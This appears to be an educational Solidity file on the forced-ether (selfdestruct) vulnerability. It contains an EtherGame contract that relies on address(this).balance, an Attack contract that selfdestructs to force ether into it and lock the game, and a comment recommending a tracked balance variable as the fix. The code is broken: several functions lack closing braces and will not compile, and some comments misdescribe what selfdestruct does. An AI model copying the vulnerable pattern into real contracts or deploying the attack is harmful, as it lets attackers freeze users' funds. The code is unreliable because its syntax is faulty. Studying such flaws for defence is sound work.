// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//represents a game where players can send 1 ether each to the contract hoping to 
//be the one that reaches the target amount equal to 7 eth
//winner will be able to withdraw the total amount of Ether 


contract EtherGame{
    uint public targetAmount = 7 ether;//public so that every contract has access to it 
    //represents the amount to be reached to win to keep track of the target 
    address public winner; //the person calling the contract to withdraw all the money


    function deposit() public payable{
//the condition to be able to deposit 
//check if the money the participant is depositing is strictly equal to 1 Ether, else if above or below throw an error         
require(msg.value == 1 ether, "You can only send 1 ether");

uint balance = address(this).balance; //setting the total amount stacked of the game to the balance of the address of this contract 
   require(balance <= targetAmount, "Game is over"); //to keep the game going, check if the balance is less the targetAmount
   //otherwise it will show that the game is over 

if (balance == targetAmount) { //set conditional statement that if balance equals to targetAmount which is 7 Ether
    winner = msg.sender; //winner is declared msg.sender which is the caller of that deposit function 
}

    function claimReward() public {
require(msg.sender == winner, "Not winner");//check the person calling this function claimReward is the winner,
//else if it is another person, it will throw an error and make him know that he is not the winner 

(bool sent, ) = msg.sender.call{value: address(this).balance}("");//transferring the total amount to msg.sender via the call method 

//bool is false by default, check if the money has been successfully sent, else it will throw an error that the transaction failed
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame ethergame;//new state variable replicating the main contract that will enable the contract attack to communicate with

constructor(EtherGame _ethergame){//constructor that takes in address of the contract to be attacked 
    ethergame = EtherGame(_ethergame); //initialise the address main contract to the new name variable of the contract Attack 

    //in order to attack, the attacker can break the contract by participating and sending Ether

function attack() public payable{//function attack that enables the attacker to send Ether so that is why it is payable

address payable addr = payable(address(ethergame));//initialising and making the address of the main contract to a payable type 
//and equating it to the address of the attacker to receive Ether 
selfdestruct(addr);//call selfdestruct function to destroy the main contract 
//this function will force to send all Ether contained in the smart contract 
}

}


/*the best way to prevent this is not to use address(this.balance) to update the current balance of 
the contract and use a state variable(balance) and update it when the user deposits funds*/

//Avoid using address(this).balance because it is vulnerable to attack 